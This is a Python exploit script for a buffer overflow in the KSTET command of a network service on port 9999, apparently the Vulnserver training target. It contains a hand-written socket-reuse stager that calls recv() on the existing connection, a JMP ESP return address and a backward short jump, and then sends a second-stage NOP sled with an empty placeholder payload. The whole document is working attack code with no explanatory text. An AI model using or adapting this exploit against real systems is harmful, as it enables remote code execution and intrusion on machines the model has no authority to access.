#!/usr/bin/python
import socket
import time

payload = ""

RHOST = ""

RPORT = 9999
# Address of JMP ESP
EIP = "\xaf\x11\x50\x62"
# Address of WS2_32.recv: 0x0040252c
# int recv(
#   SOCKET s,
#   char   *buf,
#   int    len,
#   int    flags
# );
recv_reuse = ""
# Address of Socket: 0x00bffb94
recv_reuse += "\x83\xec\x64" # SUB ESP,64
# Push flags = 00000000 onto the stack
recv_reuse += "\x33\xdb" # XOR EBX,EBX
recv_reuse += "\x53" # PUSH EBX
# Push len = 1024 onto the stack
recv_reuse += "\x80\xc7\x04" # ADD BH,0x4
recv_reuse += "\x53" # PUSH EBX
# Push *buf onto the stack
recv_reuse += "\x54" # PUSH ESP
recv_reuse += "\x5B" # POP EBX
recv_reuse += "\x83\xc3\x60" # ADD EBX,0x60
recv_reuse += "\x53" #PUSH EBX
# Push SOCKET onto the stack
recv_reuse += "\x54" # PUSH ESP
recv_reuse += "\x58" # POP EAX
recv_reuse += "\x66\x05\xf8\x01" # ADD AX,0x194
recv_reuse += "\xff\x30" # PUSH DWORD PTR DS:[EAX]
# Call recv()
recv_reuse += "\xb8\x90\x2c\x25\x40" # MOV EAX,0x40252C90
recv_reuse += "\xc1\xe8\x08" # SHR EAX,8
recv_reuse += "\xff\xd0" # CALL EAX
stage_one_buffer = ""
stage_one_buffer += "KSTET "
stage_one_buffer += recv_reuse
stage_one_buffer += ("\x90" * (70 - len(recv_reuse)))
stage_one_buffer += EIP
stage_one_buffer += "\xeb\xb4"
stage_two_buffer = ""
stage_two_buffer += "\x90" * 256
stage_two_buffer += payload
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*] Connecting to " + RHOST + " on port " + str(RPORT))
connection.connect((RHOST, RPORT))
connection.recv(1024)
print("[*] Sending stage one")
connection.send(stage_one_buffer)
time.sleep(5)
print("[*] Sending stage two")
connection.send(stage_two_buffer)
print("[*] Exploit had been sent")
